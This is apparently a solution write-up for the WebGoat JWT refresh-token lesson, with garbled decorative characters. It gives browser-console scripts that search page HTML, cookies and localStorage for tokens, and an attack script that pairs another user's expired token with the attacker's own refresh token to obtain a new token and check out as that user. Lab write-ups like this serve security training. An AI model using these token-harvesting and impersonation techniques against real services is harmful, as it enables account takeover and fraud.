â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   JWT REFRESH TOKEN - EXACT SOLUTION                     â•‘
â•‘   Based on actual WebGoat behavior                       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“‹ WHAT YOU DISCOVERED:

Clicking "Checkout" sends this token:
eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0...

Decoded: {"user":"Jerry","admin":"false"}

Response: "User is not Tom but Jerry, please try again"

This means WebGoat wants TOM to checkout, not Jerry!

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ¯ THE SOLUTION - 3 STEPS

STEP 1: Get YOUR (Jerry's) refresh_token
STEP 2: Use refresh token manipulation attack
STEP 3: Checkout as Tom

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“ STEP 1: Extract YOUR Refresh Token
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Your current access token (from the checkout button):
eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w

This token was sent in the Authorization header when you clicked
the Checkout button. But where is the refresh_token?

OPTION A: Check the lesson page for a "Login" button
â†’ Click it and check Network tab for refresh_token in response

OPTION B: Look for tokens in the page HTML
â†’ Paste this in Console (F12):

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
// Search page for refresh_token
const html = document.documentElement.innerHTML;
const match = html.match(/refresh_token["']?\s*:\s*["']([^"']+)/);
if (match) {
    console.log('âœ“ Found refresh_token:', match[1]);
    window.myRefreshToken = match[1];
} else {
    console.log('âœ— Not found in HTML');
    console.log('Check Network tab when clicking buttons');
}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

OPTION C: Check cookies/localStorage
â†’ Paste this in Console:

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
// Check storage for tokens
console.log('Cookies:', document.cookie);
console.log('localStorage:', localStorage);
console.log('sessionStorage:', sessionStorage);

// Look for refresh token
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key.includes('refresh') || key.includes('token')) {
        console.log(`âœ“ localStorage.${key}:`, localStorage.getItem(key));
    }
}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

OPTION D: Try calling the newToken endpoint to get refresh token
â†’ The page might give you one if you request it:

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
// Try to get a new token (this might return refresh_token)
fetch('/WebGoat/JWT/refresh/newToken', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({})
}).then(r => r.json()).then(d => {
    console.log('Response:', d);
    if (d.refresh_token) {
        console.log('âœ“ Got refresh_token:', d.refresh_token);
        window.myRefreshToken = d.refresh_token;
    }
});
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“ STEP 2: Execute the Refresh Token Manipulation Attack
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Once you have YOUR refresh_token, paste this in Console:

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
(async function() {
    // Tom's expired token from the log file
    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    // YOUR refresh token (replace this with actual value)
    const MY_REFRESH_TOKEN = window.myRefreshToken || 'PASTE_YOUR_REFRESH_TOKEN_HERE';
    
    if (!MY_REFRESH_TOKEN || MY_REFRESH_TOKEN === 'PASTE_YOUR_REFRESH_TOKEN_HERE') {
        console.error('âŒ Please set window.myRefreshToken first!');
        console.log('Run STEP 1 to find your refresh token');
        return;
    }
    
    console.log('%c[1] Tom\'s expired token (from log)', 'color: cyan; font-weight: bold');
    console.log('Token:', TOMS_EXPIRED_TOKEN.substring(0, 50) + '...');
    console.log('Decoded:', JSON.parse(atob(TOMS_EXPIRED_TOKEN.split('.')[1])));
    
    console.log('%c[2] Your refresh token', 'color: cyan; font-weight: bold');
    console.log('Token:', MY_REFRESH_TOKEN.substring(0, 50) + '...');
    
    // THE ATTACK: Use Tom's expired token + YOUR refresh token
    console.log('%c[3] âš¡ Executing refresh token manipulation...', 'color: red; font-weight: bold');
    
    const refreshResp = await fetch('/WebGoat/JWT/refresh/newToken', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,  // â† Tom's expired token
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            refresh_token: MY_REFRESH_TOKEN  // â† YOUR refresh token
        })
    });
    
    if (!refreshResp.ok) {
        console.error('âŒ Refresh failed:', refreshResp.status, refreshResp.statusText);
        const text = await refreshResp.text();
        console.log('Response:', text);
        return;
    }
    
    const refreshData = await refreshResp.json();
    const tomsNewToken = refreshData.access_token;
    
    console.log('%câœ… SUCCESS! Got Tom\'s NEW token!', 'color: green; font-weight: bold; font-size: 16px');
    console.log('Tom\'s new token:', tomsNewToken);
    
    // Decode and verify it's Tom's token
    const decoded = JSON.parse(atob(tomsNewToken.split('.')[1]));
    console.log('Decoded:', decoded);
    console.log(`User: ${decoded.user} ${decoded.user === 'Tom' ? 'âœ…' : 'âŒ'}`);
    
    // STEP 3: Checkout as Tom
    console.log('%c[4] ğŸ›’ Checking out as Tom...', 'color: cyan; font-weight: bold');
    
    const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + tomsNewToken,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        }
    });
    
    const checkoutData = await checkoutResp.json();
    
    if (checkoutData.lessonCompleted) {
        console.log('%cğŸ‰ SUCCESS! TOM PAID FOR THE BOOKS!', 'color: white; background: green; font-size: 18px; font-weight: bold; padding: 10px');
        console.log('Response:', checkoutData);
    } else {
        console.log('%câš ï¸ Checkout response:', 'color: orange; font-weight: bold');
        console.log(checkoutData);
        
        if (checkoutData.feedback) {
            console.log('Feedback:', checkoutData.feedback);
        }
    }
    
    // Store for manual testing
    window.tomsNewToken = tomsNewToken;
    console.log('\nğŸ’¡ Token saved to: window.tomsNewToken');
    
})();
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“ STEP 3: Manual Checkout (if needed)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

If the script didn't complete checkout, use Tom's token manually:

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
// Use Tom's new token to checkout
fetch('/WebGoat/JWT/refresh/checkout', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + window.tomsNewToken,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
}).then(r => r.json()).then(d => {
    console.log('Result:', d);
    if (d.lessonCompleted) {
        console.log('ğŸ‰ SUCCESS!');
    }
});
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ” DEBUGGING - If Still Getting "User is not Tom but Jerry"
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Check what user is in the token:

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
// Decode the token being used
function decodeToken(token) {
    const payload = token.split('.')[1];
    return JSON.parse(atob(payload));
}

// Check Tom's new token
console.log('Token payload:', decodeToken(window.tomsNewToken));
// Should show: {"user": "Tom", ...}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

If it still shows "Jerry", then the refresh attack didn't work.
This means:
1. Your refresh_token is wrong
2. The endpoint validates token ownership (no vulnerability)
3. The lesson works differently

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âš ï¸ IMPORTANT NOTES
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Your current token (Jerry):
eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w

Decoded:
{
  "user": "Jerry",
  "admin": "false"
}

Tom's expired token (from log):
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q

Decoded:
{
  "iat": 1526131411,
  "exp": 1526217811,
  "admin": "false",
  "user": "Tom"
}

The attack:
- Send Tom's EXPIRED token in Authorization header
- Send YOUR (Jerry's) refresh_token in body
- Server should return NEW token for Tom
- Use Tom's NEW token to checkout

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“š SUMMARY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. âœ… You have Jerry's access token (from checkout button)
2. â“ You need Jerry's refresh_token (find it with STEP 1)
3. âš¡ Use refresh token manipulation (STEP 2)
4. ğŸ›’ Checkout with Tom's new token (STEP 3)

The key is finding YOUR refresh_token!
Try the OPTION A/B/C/D scripts in STEP 1 above.

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
